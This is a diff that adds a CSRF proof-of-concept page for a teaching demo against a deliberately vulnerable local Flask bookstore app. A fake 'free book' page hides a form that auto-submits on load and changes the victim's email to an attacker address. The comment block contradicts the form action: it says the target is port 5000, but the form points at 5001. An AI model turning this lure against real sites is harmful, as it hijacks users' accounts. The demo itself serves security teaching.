@@ -1,0 +1,55 @@
+<!doctype html>
+<!--
+  CSRF proof-of-concept page (targets the Python/Flask vulnerable app on
+  port 5000).
+
+  How to demo it:
+    1. Start the VULNERABLE app (port 5000) and log in as alice
+       (alice / alice123) in your browser.
+    2. Without logging out, open THIS file directly in the same browser
+       (e.g. double-click it, or File > Open).
+    3. The page below looks like an innocent "you won a free book!" page.
+       The moment it loads, the hidden form auto-submits a GET request to
+       BookNest's own /profile/update-email endpoint, using alice's
+       existing session cookie (the browser attaches it automatically —
+       the attacker's page never needs to see or steal the cookie).
+    4. Go back to http://localhost:5000/profile — alice's email has been
+       changed to attacker-controlled@evil.com, even though alice never
+       filled in or submitted that form herself.
+
+  Run the SAME steps against the SAFE app (port 5001, change the form
+  action below to localhost:5001) to see it get rejected (403 Forbidden,
+  because that endpoint is POST-only and requires a CSRF token this page
+  has no way to know).
+-->
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>You've won a free book! 🎉</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; margin-top: 80px; }
+    h1 { color: #c0392b; }
+  </style>
+</head>
+<body>
+  <h1>🎉 Congratulations! 🎉</h1>
+  <p>You've won a free book from BookNest. Click below to claim it!</p>
+  <button onclick="alert('Claimed! (meanwhile, something else already happened...)')">Claim my prize</button>
+
+  <!--
+    This is the actual attack: a hidden form targeting the vulnerable
+    app's update-email endpoint, auto-submitted by the script below.
+    Because the vulnerable route accepts GET and checks no token, this
+    works the instant the page loads.
+  -->
+  <form id="csrf-form" action="http://localhost:5001/profile/update-email" method="GET" style="display:none">
+    <input type="hidden" name="email" value="attacker-controlled@evil.com">
+  </form>
+
+  <script>
+    // Auto-submit the instant the page loads — the victim does not need
+    // to click anything.
+    document.getElementById('csrf-form').submit();
+  </script>
+</body>
+</html>
